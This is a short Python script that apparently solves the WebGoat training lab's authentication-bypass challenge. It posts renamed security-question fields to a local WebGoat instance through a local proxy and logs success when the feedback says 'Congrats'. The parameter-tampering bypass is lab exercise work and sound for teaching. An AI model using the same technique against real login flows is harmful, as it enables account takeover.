import requests
import json
import logging

def run_script(url, cookie, proxy='127.0.0.1:8081'):
    proxies = {
            'http': f'http://{proxy}',
            'https': f'https://{proxy}'
        }
    headers = {"Cookie": cookie, "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "http://127.0.0.1:8080", "Connection": "close", "Referer": "http://127.0.0.1:8080/WebGoat/start.mvc", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "X-PwnFox-Color": "red"}
    data = {"TestsecQuestion0": "test", "TestsecQuestion1": "test", "jsEnabled": "1", "verifyMethod": "SEC_QUESTIONS", "userId": "12309746"}
    response=requests.post(url, headers=headers, data=data, proxies=proxies)
    response_json = json.loads(response.text)
    if 'Congrats' in response_json["feedback"]:
        logging.info('[*] Challenge auth-bypass validé\n')